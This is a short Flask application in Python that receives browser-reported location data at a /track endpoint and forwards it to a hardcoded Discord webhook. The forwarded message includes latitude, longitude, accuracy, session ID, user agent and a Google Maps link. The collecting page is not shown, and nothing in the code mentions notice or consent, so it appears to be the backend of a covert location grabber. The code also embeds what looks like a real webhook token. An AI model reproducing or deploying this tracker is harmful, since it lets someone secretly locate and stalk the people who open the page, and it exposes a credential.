from flask import Flask, request, jsonify, send_file
import json
import datetime
import requests

app = Flask(__name__)

# Your NEW Discord webhook URL
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536189236431290369/lAIwbt_ESg5gor_CXxkx7WbR8Sjol7lMtg_EeWVYBJaiK8c_8znAEXMPGUxQxrwF5deB"

@app.route('/')
def serve_index():
    return send_file('../static/index.html')

@app.route('/track', methods=['POST'])
def track_data():
    data = request.json
    print("Data received:", json.dumps(data, indent=2))
    
    # Send to Discord
    try:
        # Simple message with location
        location = data.get('location', {})
        lat = location.get('latitude', 'N/A')
        lng = location.get('longitude', 'N/A')
        accuracy = location.get('accuracy', 'N/A')
        
        message = f"""
📍 **Location Data Received!**
- Latitude: {lat}
- Longitude: {lng}
- Accuracy: ±{accuracy}m
- Session: {data.get('sessionId', 'unknown')}
- Browser: {data.get('userAgent', 'unknown')[:50]}

Google Maps: https://maps.google.com/?q={lat},{lng}
        """
        
        payload = {"content": message, "username": "Location Tracker"}
        response = requests.post(DISCORD_WEBHOOK, json=payload, timeout=10)
        
        print(f"Discord status: {response.status_code}")
        if response.status_code == 204:
            discord_sent = True
        else:
            print(f"Discord error: {response.text}")
            discord_sent = False
            
    except Exception as e:
        print(f"Error: {e}")
        discord_sent = False
    
    return jsonify({"status": "success", "discord_sent": discord_sent})

@app.route('/health')
def health():
    return jsonify({"status": "healthy"})

app = app
